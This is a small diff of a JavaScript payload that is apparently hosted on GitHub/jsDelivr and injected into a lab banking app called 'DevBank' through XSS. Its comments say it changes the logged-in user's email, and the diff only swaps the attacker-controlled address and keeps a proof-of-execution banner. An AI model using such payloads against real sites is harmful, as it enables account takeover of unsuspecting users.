@@ -2,7 +2,7 @@
 // This file is loaded from my GitHub/jsDelivr link.
 // When it runs in DevBank, it changes the logged-in user's email.
 
-var newEmail = "xss-owned@devbank.local";
+var newEmail = "JUICE888-owned@devbank.local";
 
 // Show a message on the page so I can prove the external script executed.
 document.body.prepend("External payload executed");
